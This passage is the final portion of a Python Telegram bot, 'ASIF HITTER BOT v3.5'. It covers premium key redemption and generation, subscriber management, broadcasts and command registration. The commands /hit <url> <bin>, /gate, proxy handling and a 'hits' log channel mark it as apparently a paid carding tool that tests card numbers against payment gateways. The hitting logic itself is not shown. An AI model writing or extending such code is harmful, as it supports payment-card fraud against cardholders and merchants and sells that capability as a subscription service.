        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/redeem &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
            return
        
        key = ctx.args[0]
        kd = _sync_load_json(KEYS_FILE, {"keys": {}})
        
        if key not in kd["keys"]:
            await update.message.reply_text(f"{e('❌')} Invalid key!", parse_mode=ParseMode.HTML)
            return
        
        kdata = kd["keys"][key]
        if kdata.get("used"):
            await update.message.reply_text(f"{e('❌')} Key already used", parse_mode=ParseMode.HTML)
            return
        
        hours = kdata.get("hours", kdata.get("days", 1) * 24)
        expiry = (datetime.now() + timedelta(hours=hours)).isoformat()
        
        kdata["used"] = True
        kdata["used_by"] = uid
        kdata["expiry"] = expiry
        _sync_save_json(KEYS_FILE, kd)
        
        dur = f"{hours//24} day(s)" if hours >= 24 else f"{hours} hour(s)"
        
        pd = _sync_load_json(PREMIUM_FILE, {"users": {}})
        pd["users"][str(uid)] = {
            "name": update.effective_user.full_name,
            "username": update.effective_user.username or "",
            "activated": datetime.now().isoformat(),
            "expiry": expiry,
            "key": key,
            "plan": dur,
        }
        _sync_save_json(PREMIUM_FILE, pd)
        _refresh_cache()
        
        await update.message.reply_text(
            f"{ec('🎉',3)} <b>PREMIUM ACTIVATED!</b> {ec('🎉',3)}\n\n"
            f"{e('👑')} Welcome to ASIF HITTER!\n\n"
            f"{e('🔑')} Key: <code>{key}</code>\n"
            f"{e('⏱️')} Expires: <code>{expiry[:10]}</code>\n"
            f"{e('💎')} Plan: <code>{dur}</code>\n\n"
            f"{e('🚀')} Use /hit to start!",
            parse_mode=ParseMode.HTML
        )
    except Exception as ex:
        logger.error(f"/redeem error: {ex}")
        await update.message.reply_text(f"❌ Error: {str(ex)[:100]}")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if is_admin(uid):
            await update.message.reply_text(f"{e('⚡')} {e('👑')} <b>ADMIN</b>\n\nPermanent access", parse_mode=ParseMode.HTML)
        elif is_premium_sync(uid):
            pd = _sync_load_json(PREMIUM_FILE, {"users": {}})
            u = pd["users"].get(str(uid), {})
            await update.message.reply_text(
                f"{e('👑')} <b>PREMIUM ACTIVE</b>\n\n"
                f"{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
                f"{e('💎')} Plan: <code>{u.get('plan','?')}</code>",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(f"{e('⛔')} <b>FREE</b>\n\n{e('🔑')} /redeem &lt;key&gt;", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/status error: {ex}")

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id): return
        
        if len(ctx.args) < 2:
            await update.message.reply_text(f"{e('⚠️')} <code>/genkey 10 24</code>", parse_mode=ParseMode.HTML)
            return
        
        count, dur = int(ctx.args[0]), int(ctx.args[1])
        hours = dur
        
        kd = _sync_load_json(KEYS_FILE, {"keys": {}})
        new_keys = []
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        
        for _ in range(count):
            k = f"ASIF-{''.join(random.choices(chars, k=20))}"
            while k in kd["keys"]:
                k = f"ASIF-{''.join(random.choices(chars, k=20))}"
            kd["keys"][k] = {"hours": hours, "used": False, "used_by": None, "created": datetime.now().isoformat()}
            new_keys.append(k)
        
        _sync_save_json(KEYS_FILE, kd)
        _refresh_cache()
        
        txt = f"{e('🎁')} <b>KEYS</b> ({count}x {dur}h)\n\n" + "\n".join([f"<code>{k}</code>" for k in new_keys])
        
        if len(new_keys) > 15:
            buf = StringIO("\n".join(new_keys))
            await update.message.reply_document(InputFile(buf, filename="keys.txt"), caption=f"{count} keys ({dur}h)")
        else:
            await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/genkey error: {ex}")

async def cmd_premium_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id): return
        
        pd = _sync_load_json(PREMIUM_FILE, {"users": {}})
        users = pd.get("users", {})
        
        if not users:
            await update.message.reply_text(f"{e('❌')} No users", parse_mode=ParseMode.HTML)
            return
        
        txt = f"{e('👑')} <b>PREMIUM USERS ({len(users)})</b>\n\n"
        for uid, u in users.items():
            try:
                exp = datetime.fromisoformat(u.get("expiry","2000-01-01"))
                active = e('🟢') if datetime.now() < exp else e('🔴')
                txt += f"{active} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n"
                txt += f"   {e('⏱️')} {u.get('expiry','?')[:10]} | {e('💎')} {u.get('plan','?')}\n\n"
            except: pass
        
        await update.message.reply_text(txt[:4000], parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/premium error: {ex}")

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id): return
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} /rmsub &lt;user_id&gt;", parse_mode=ParseMode.HTML)
            return
        
        uid = ctx.args[0]
        pd = _sync_load_json(PREMIUM_FILE, {"users": {}})
        if uid in pd.get("users", {}):
            del pd["users"][uid]
            _sync_save_json(PREMIUM_FILE, pd)
            _refresh_cache()
            await update.message.reply_text(f"{e('✅')} Removed", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"{e('❌')} Not found", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/rmsub error: {ex}")

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id): return
        msg = update.message.text.replace("/broadcast", "").strip()
        if not msg:
            await update.message.reply_text(f"{e('⚠️')} /broadcast &lt;msg&gt;", parse_mode=ParseMode.HTML)
            return
        
        pd = _sync_load_json(PREMIUM_FILE, {"users": {}})
        sent = 0
        for uid in pd.get("users", {}):
            try:
                await ctx.bot.send_message(int(uid), f"{e('📢')} <b>BROADCAST</b>\n\n{msg}", parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.2)
            except: pass
        await update.message.reply_text(f"{e('✅')} Sent: {sent}", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/broadcast error: {ex}")

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id): return
        if ctx.args:
            await update_setting("log_channel", ctx.args[0])
            await update.message.reply_text(f"{e('✅')} Log: {h(ctx.args[0])}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"{e('ℹ️')} /sethits @channel", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/sethits error: {ex}")

# ═══════════════════════════════════════════════════════════
# CALLBACKS
# ═══════════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        q = update.callback_query
        await q.answer()
        d = q.data
        uid = q.from_user.id
        
        if d == "gate_help":
            await q.message.reply_text(f"{e('🌐')} <b>Gateway</b>\n<code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
        elif d == "hit_help":
            await q.message.reply_text(f"{e('💳')} <b>Hit</b>\n<code>/hit &lt;url&gt; &lt;bin&gt;</code>", parse_mode=ParseMode.HTML)
        elif d == "redeem_help":
            await q.message.reply_text(f"{e('🔑')} <b>Redeem</b>\n<code>/redeem &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
        elif d == "status":
            await cmd_status(update, ctx)
        elif d == "proxy_menu":
            await q.message.reply_text(f"{e('🔐')} <b>Proxy</b>\n/addproxy | /proxy | /rmproxy", parse_mode=ParseMode.HTML)
        elif d == "admin" and is_admin(uid):
            await q.message.reply_text(f"{e('⚡')} <b>ADMIN</b>\n/genkey | /premium | /rmsub | /broadcast | /sethits", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"Callback error: {ex}")

# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    """Main entry point"""
    logger.info("="*50)
    logger.info("ASIF HITTER BOT v3.5 STARTING")
    logger.info("="*50)
    
    # Validate token
    if BOT_TOKEN in ("YOUR_BOT_TOKEN_HERE", ""):
        logger.error("BOT_TOKEN not set! Set it in environment or in the script.")
        print("❌ BOT_TOKEN not configured!")
        sys.exit(1)
    
    # Ensure data directory
    _ensure_data_dir()
    _refresh_cache()
    
    logger.info(f"Data directory: {DATA_DIR}")
    logger.info(f"Settings: {get_setting_sync('version', '3.5')}")
    
    # Build application
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .build()
    )
    
    # Register error handler
    app.add_error_handler(error_handler)
    
    # Register all handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("auth", cmd_redeem))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium_list))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    
    # Run
    logger.info("Starting polling...")
    print("✅ Bot is running. Press Ctrl+C to stop.")
    
    try:
        app.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
            close_loop=False,
        )
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as ex:
        logger.error(f"Fatal error: {ex}")
        logger.error(traceback.format_exc())
    finally:
        logger.info("Bot shutdown complete")

if __name__ == "__main__":
    main()